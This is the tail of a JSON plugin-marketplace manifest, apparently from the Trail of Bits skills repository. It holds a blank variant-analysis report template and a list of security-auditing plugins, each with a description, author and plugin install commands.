        "plugins/variant-analysis/skills/variant-analysis/resources/variant-report-template.md": "# Variant Analysis Report\n\n## Summary\n\n| Field | Value |\n|-------|-------|\n| **Original Bug** | [BUG_ID / CVE] |\n| **Analysis Date** | [DATE] |\n| **Codebase** | [REPO/PROJECT] |\n| **Variants Found** | [COUNT] |\n\n## Original Vulnerability\n\n**Root Cause:** [e.g., \"User input reaches SQL query without parameterization\"]\n\n**Location:** `[path/to/file.py:LINE]` in `function_name()`\n\n```python\n# Vulnerable code\n```\n\n## Search Methodology\n\n| Version | Pattern | Tool | Matches | TP | FP |\n|---------|---------|------|---------|----|----|\n| v1 | [exact] | ripgrep | 1 | 1 | 0 |\n| v2 | [abstract] | semgrep | N | N | N |\n\n**Final Pattern:**\n```yaml\n# Pattern used\n```\n\n## Findings\n\n### Variant #1: [BRIEF_TITLE]\n\n| Severity | Confidence | Status |\n|----------|------------|--------|\n| High | High | Confirmed |\n\n**Location:** `[path/to/file.py:LINE]`\n\n```python\n# Vulnerable code\n```\n\n**Analysis:** [Why this is a true/false positive]\n\n**Exploitability:**\n- [ ] Reachable from external input\n- [ ] User-controlled data\n- [ ] No sanitization\n\n---\n\n<!-- Copy variant template above for additional findings -->\n\n## False Positive Patterns\n\n| Pattern | Count | Reason |\n|---------|-------|--------|\n| [pattern] | N | [why safe] |\n\n## Recommendations\n\n### Immediate\n1. Fix variant in [location]\n\n### Preventive\n1. Add Semgrep rule to CI\n\n```yaml\n# CI-ready rule\n```"
      },
      "plugins": [
        {
          "name": "ask-questions-if-underspecified",
          "version": "1.0.0",
          "description": "Clarify requirements before implementing. When doubting, ask questions.",
          "author": {
            "name": "Kevin Valerio",
            "email": "opensource@trailofbits.com",
            "url": "https://github.com/trailofbits"
          },
          "source": "./plugins/ask-questions-if-underspecified",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install ask-questions-if-underspecified@trailofbits"
          ]
        },
        {
          "name": "audit-context-building",
          "description": "Build deep architectural context through ultra-granular code analysis before vulnerability hunting",
          "version": "1.0.0",
          "author": {
            "name": "Omar Inuwa"
          },
          "source": "./plugins/audit-context-building",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install audit-context-building@trailofbits"
          ]
        },
        {
          "name": "building-secure-contracts",
          "version": "1.0.0",
          "description": "Comprehensive smart contract security toolkit based on Trail of Bits' Building Secure Contracts framework. Includes vulnerability scanners for 6 blockchains and 5 development guideline assistants.",
          "author": {
            "name": "Omar Inuwa"
          },
          "source": "./plugins/building-secure-contracts",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install building-secure-contracts@trailofbits"
          ]
        },
        {
          "name": "burpsuite-project-parser",
          "version": "1.0.0",
          "description": "Search and extract data from Burp Suite project files (.burp) for use in Claude",
          "author": {
            "name": "Will Vandevanter"
          },
          "source": "./plugins/burpsuite-project-parser",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install burpsuite-project-parser@trailofbits"
          ]
        },
        {
          "name": "constant-time-analysis",
          "version": "0.1.0",
          "description": "Detect compiler-induced timing side-channels in cryptographic code",
          "author": {
            "name": "Scott Arciszewski",
            "email": "opensource@trailofbits.com"
          },
          "source": "./plugins/constant-time-analysis",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install constant-time-analysis@trailofbits"
          ]
        },
        {
          "name": "culture-index",
          "version": "1.0.0",
          "description": "Interprets Culture Index survey results for individuals and teams",
          "author": {
            "name": "Dan Guido"
          },
          "source": "./plugins/culture-index",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install culture-index@trailofbits"
          ]
        },
        {
          "name": "differential-review",
          "description": "Security-focused differential review of code changes with git history analysis and blast radius estimation",
          "version": "1.0.0",
          "author": {
            "name": "Omar Inuwa"
          },
          "source": "./plugins/differential-review",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install differential-review@trailofbits"
          ]
        },
        {
          "name": "firebase-apk-scanner",
          "version": "2.1.0",
          "description": "Scan Android APKs for Firebase security misconfigurations including open databases, storage buckets, authentication issues, and exposed cloud functions. For authorized security research only.",
          "author": {
            "name": "Nick Sellier"
          },
          "source": "./plugins/firebase-apk-scanner",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install firebase-apk-scanner@trailofbits"
          ]
        },
        {
          "name": "fix-review",
          "description": "Verify fix commits address audit findings without introducing bugs",
          "version": "0.1.0",
          "author": {
            "name": "Trail of Bits",
            "email": "opensource@trailofbits.com"
          },
          "source": "./plugins/fix-review",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install fix-review@trailofbits"
          ]
        },
        {
          "name": "dwarf-expert",
          "description": "Interact with and understand the DWARF debugging format",
          "version": "1.0.0",
          "author": {
            "name": "Evan Hellman",
            "email": "opensource@trailofbits.com"
          },
          "source": "./plugins/dwarf-expert",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install dwarf-expert@trailofbits"
          ]
        },
        {
          "name": "entry-point-analyzer",
          "version": "1.0.0",
          "description": "Analyzes smart contract codebases to identify state-changing entry points for security auditing. Detects externally callable functions that modify state, categorizes them by access level, and generates structured audit reports.",
          "author": {
            "name": "Nicolas Donboly",
            "email": "opensource@trailofbits.com",
            "url": "https://github.com/trailofbits"
          },
          "source": "./plugins/entry-point-analyzer",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install entry-point-analyzer@trailofbits"
          ]
        },
        {
          "name": "property-based-testing",
          "description": "Property-based testing guidance for multiple languages and smart contracts",
          "version": "1.0.0",
          "author": {
            "name": "Henrik Brodin",
            "email": "opensource@trailofbits.com"
          },
          "source": "./plugins/property-based-testing",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install property-based-testing@trailofbits"
          ]
        },
        {
          "name": "semgrep-rule-creator",
          "version": "1.0.0",
          "description": "Create custom Semgrep rules for detecting bug patterns and security vulnerabilities",
          "author": {
            "name": "Maciej Domanski"
          },
          "source": "./plugins/semgrep-rule-creator",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install semgrep-rule-creator@trailofbits"
          ]
        },
        {
          "name": "semgrep-rule-variant-creator",
          "version": "1.0.0",
          "description": "Creates language variants of existing Semgrep rules with proper applicability analysis and test-driven validation",
          "author": {
            "name": "Maciej Domanski",
            "email": "opensource@trailofbits.com"
          },
          "source": "./plugins/semgrep-rule-variant-creator",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install semgrep-rule-variant-creator@trailofbits"
          ]
        },
        {
          "name": "sharp-edges",
          "version": "1.0.0",
          "description": "Identify error-prone APIs, dangerous configurations, and footgun designs that enable security mistakes",
          "author": {
            "name": "Scott Arciszewski",
            "email": "opensource@trailofbits.com",
            "url": "https://github.com/trailofbits"
          },
          "source": "./plugins/sharp-edges",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install sharp-edges@trailofbits"
          ]
        },
        {
          "name": "static-analysis",
          "version": "1.0.1",
          "description": "Static analysis toolkit with CodeQL, Semgrep, and SARIF parsing for security vulnerability detection",
          "author": {
            "name": "Axel Mierczuk"
          },
          "source": "./plugins/static-analysis",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install static-analysis@trailofbits"
          ]
        },
        {
          "name": "spec-to-code-compliance",
          "description": "Specification-to-code compliance checker for blockchain audits with evidence-based alignment analysis",
          "version": "1.0.0",
          "author": {
            "name": "Omar Inuwa"
          },
          "source": "./plugins/spec-to-code-compliance",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install spec-to-code-compliance@trailofbits"
          ]
        },
        {
          "name": "testing-handbook-skills",
          "version": "1.0.0",
          "description": "Skills from the Trail of Bits Application Security Testing Handbook (appsec.guide)",
          "author": {
            "name": "Pawe Patek"
          },
          "source": "./plugins/testing-handbook-skills",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install testing-handbook-skills@trailofbits"
          ]
        },
        {
          "name": "variant-analysis",
          "version": "1.0.0",
          "description": "Find similar vulnerabilities and bugs across codebases using pattern-based analysis",
          "author": {
            "name": "Axel Mierczuk"
          },
          "source": "./plugins/variant-analysis",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install variant-analysis@trailofbits"
          ]
        },
        {
          "name": "modern-python",
          "version": "1.2.0",
          "description": "Modern Python best practices. Use when creating new Python projects, and writing Python scripts, or migrating existing projects from legacy tools.",
          "author": {
            "name": "William Tan",
            "email": "opensource@trailofbits.com",
            "url": "https://github.com/trailofbits"
          },
          "source": "./plugins/modern-python",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install modern-python@trailofbits"
          ]
        },
        {
          "name": "insecure-defaults",
          "version": "1.0.0",
          "description": "Detects and verifies insecure default configurations including hardcoded credentials, fallback secrets, weak authentication defaults, and dangerous configuration values that remain active in production",
          "author": {
            "name": "Trail of Bits",
            "email": "opensource@trailofbits.com",
            "url": "https://github.com/trailofbits"
          },
          "source": "./plugins/insecure-defaults",
          "categories": [],
          "install_commands": [
            "/plugin marketplace add trailofbits/skills",
            "/plugin install insecure-defaults@trailofbits"
          ]
        }
      ]
    }
  ]
}